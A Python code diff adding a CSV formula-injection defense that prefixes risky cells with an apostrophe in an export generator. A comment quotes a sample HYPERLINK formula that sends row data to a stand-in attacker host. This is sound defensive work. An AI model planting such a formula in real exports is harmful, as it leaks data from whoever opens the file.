@@ -129,6 +129,49 @@ PIPELINE_CSV_COLUMNS = [
 ]
 
 
+# F283 (closes F138) — CSV formula-injection defense.
+#
+# Excel / Google Sheets / LibreOffice interpret any cell whose first
+# character is one of ``= + - @`` (and TAB / CR in some versions) as a
+# formula when the CSV is opened. An attacker who can write to ANY
+# string field that ends up in our CSVs (contact name, company name,
+# job title, audit log metadata, etc.) can plant a payload like
+# ``=HYPERLINK("https://attacker.example/steal?d="&A1, "Click")`` —
+# when an admin opens the export, that cell auto-fetches its row's
+# data to the attacker's server. The CWE is CWE-1236.
+#
+# The OWASP-recommended mitigation: prefix risky cells with a single
+# quote (``'``) which Excel/Sheets discard on display but which
+# breaks the formula prefix character. We do this in ``_csv_safe``
+# below and apply it inside ``_iter_csv`` so every handler benefits
+# without having to remember per-field. The escape is no-op for
+# non-string types (numbers serialise via csv.writer's int/float
+# handling and never start with ``=``).
+_CSV_FORMULA_TRIGGERS: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value):
+    """Return ``value`` with formula-trigger characters defanged.
+
+    Strings starting with ``= + - @ TAB CR`` get a leading single
+    quote prefix; that quote is what Excel/Sheets strips on display
+    while neutralising the formula. Non-string types (int, None,
+    bool, etc.) are returned unchanged — ``csv.writer`` handles
+    their serialisation and they can't start with a trigger char.
+
+    Numeric strings ARE escaped if they start with ``-`` (e.g.
+    ``"-12345.67"`` for negative numbers): Excel still interprets
+    ``-12345`` as ``=-12345`` because the leading ``-`` triggers
+    formula parsing. The leading-apostrophe doesn't change the
+    displayed value but does prevent formula execution.
+    """
+    if not isinstance(value, str) or not value:
+        return value
+    if value[0] in _CSV_FORMULA_TRIGGERS:
+        return "'" + value
+    return value
+
+
 def _iter_csv(rows, columns: list[str]):
     """Generator that yields CSV content line by line.
 
@@ -136,20 +179,27 @@ def _iter_csv(rows, columns: list[str]):
     materialise everything before invoking. Now accepts ANY iterable
     so the export handlers can pass a row-by-row generator and keep
     peak memory flat at chunk-size instead of result-set-size.
+
+    F283: every cell is filtered through ``_csv_safe`` so a cell
+    that starts with ``= + - @`` (Excel formula triggers) gets a
+    leading apostrophe — defangs CSV-formula-injection at the only
+    chokepoint without each handler having to remember.
     """
     output = io.StringIO()
     writer = csv.writer(output)
 
-    # Header
-    writer.writerow(columns)
+    # Header — column names are static and known-safe, but pipe through
+    # the escape anyway for symmetry. Cheap when ``_csv_safe`` is no-op.
+    writer.writerow([_csv_safe(c) for c in columns])
     yield output.getvalue()
     output.seek(0)
     output.truncate(0)
 
     # Data rows — iterate lazily over whatever the caller passed
-    # (list, generator, async-to-sync bridge, etc.)
+    # (list, generator, async-to-sync bridge, etc.) — and defang
+    # every cell.
     for row in rows:
-        writer.writerow(row)
+        writer.writerow([_csv_safe(cell) for cell in row])
         yield output.getvalue()
         output.seek(0)
         output.truncate(0)
